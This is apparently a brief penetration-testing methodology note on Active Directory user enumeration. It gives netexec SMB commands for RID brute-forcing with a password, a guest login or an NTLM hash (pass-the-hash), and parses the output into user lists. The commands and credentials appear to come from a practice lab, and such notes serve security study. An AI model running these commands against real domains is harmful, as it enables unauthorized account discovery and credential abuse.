After getting your first credentials on the domain, this will brute force sid and rid to optain initial user and group information. 
```
netexec smb 10.10.253.194 -u 'twilliams' -p 'roastpotatoes' e | tee crackmapexec-rid-brute
```

Sometimes works without creds:
```
netexec smb 10.10.253.194 -u 'guest' -p '' e | tee crackmapexec-rid-brute
netexec smb $target -u 'guest' -p '' e | grep -i 'sidtypeuser' | awk '{print$6}' | cut -d '\' -f2 | tee userlist2.txt
```

```
netexec smb $target -u leicester.lawton -H 25cac0569934a5f6e01e9e440e0dce5b --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}'  | tee users
```

![unnamed_dac4f8988cb04f8fa97229c682a28c8d](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Enumeration/User%20discovery/netexec%20rid-brute/{{notename}}-202605011506.png)
